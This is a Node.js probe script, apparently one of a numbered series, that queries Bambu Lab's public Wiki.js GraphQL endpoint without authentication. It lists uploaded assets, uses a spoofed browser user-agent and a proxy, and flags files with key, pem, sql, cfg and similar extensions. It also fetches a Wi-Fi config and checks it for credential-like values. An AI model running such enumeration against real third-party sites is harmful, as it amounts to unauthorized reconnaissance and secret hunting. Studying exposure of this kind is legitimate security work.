// 38 - Unauthenticated Wiki.js asset enumeration.
//
// The public GraphQL assets.list returns uploaded files without auth. This
// harness records counts/extensions and checks two non-image assets:
//   /user_wifi.cfg          (sample config with placeholders)
//   /software/fix-bambu-studio.bat (public Bambu Studio fix script)
//
// No bulk download; no unrelated content.
//
// Run: node run.js

const { ProxyAgent, fetch } = require('undici');
const fs = require('fs');
const path = require('path');

const BASE = process.env.WIKI_BASE || 'https://wiki.bambulab.com';
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

async function gql(query) {
  const r = await fetch(BASE + '/graphql', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'user-agent': UA },
    body: JSON.stringify({ query }),
    dispatcher,
    signal: AbortSignal.timeout(60000),
  });
  return { status: r.status, text: await r.text() };
}

async function get(p) {
  try {
    const r = await fetch(BASE + p, { headers: { 'user-agent': UA }, dispatcher, signal: AbortSignal.timeout(20000) });
    const t = await r.text();
    return { status: r.status, type: r.headers.get('content-type'), len: t.length, text: t };
  } catch (e) { return { status: 'ERR', type: '', len: 0, text: '' }; }
}

(async () => {
  const results = {
    base: BASE,
    timestamp: new Date().toISOString(),
    hypothesis:
      'Unauthenticated Wiki.js assets.list exposes uploaded filenames, including non-image config/script assets.',
    total: 0,
    extensions: {},
    special: [],
    checks: [],
  };

  const a = await gql('{ assets { list(folderId:0, kind:ALL){ filename } } }');
  let list = [];
  try { list = JSON.parse(a.text).data?.assets?.list || []; } catch {}
  results.total = list.length;
  const exts = {};
  for (const x of list) {
    const e = (x.filename.split('.').pop() || '').toLowerCase();
    exts[e] = (exts[e] || 0) + 1;
  }
  results.extensions = exts;
  results.special = list
    .filter((x) => /\.(cfg|bat|ini|conf|sh|ps1|zip|sql|pem|key)$/i.test(x.filename))
    .map((x) => x.filename);
  console.log('assets', results.total, 'exts', JSON.stringify(exts));
  console.log('special', JSON.stringify(results.special));

  for (const p of ['/user_wifi.cfg', '/software/fix-bambu-studio.bat']) {
    const r = await get(p);
    const row = { path: p, status: r.status, type: r.type, len: r.len };
    if (p.endsWith('.cfg') && r.status === 200) {
      row.samplePlaceholders = /ssid\s*:\s*wifiname/i.test(r.text) && /password\s*:\s*wifipassword/i.test(r.text);
      row.hasSecretLike = /(ssid|password|psk)\s*:\s*(?!wifiname|wifipassword)[^\s]+/i.test(r.text);
    }
    if (p.endsWith('.bat') && r.status === 200) {
      row.publicScript = /BambuStudio\.conf/i.test(r.text);
    }
    results.checks.push(row);
    console.log('CHECK', JSON.stringify(row));
  }

  results.summary = {
    assetsListed: results.total,
    nonImage: results.special.length,
    sampleConfigPublic: results.checks.find((c) => c.path.endsWith('.cfg'))?.status === 200,
    configSecrets: results.checks.find((c) => c.path.endsWith('.cfg'))?.hasSecretLike || false,
  };
  console.log('SUMMARY', JSON.stringify(results.summary));

  fs.writeFileSync(path.join(__dirname, 'results.json'), JSON.stringify(results, null, 2));
  fs.writeFileSync(
    path.join(__dirname, 'results.txt'),
    [
      `assets: ${results.total}`,
      `extensions: ${JSON.stringify(results.extensions)}`,
      `special: ${JSON.stringify(results.special)}`,
      ...results.checks.map((c) => `CHECK ${c.path} => ${c.status} ${c.type} ${c.len} ${JSON.stringify(c)}`),
      'SUMMARY ' + JSON.stringify(results.summary),
    ].join('\n') + '\n'
  );
  process.exit(0);
})();
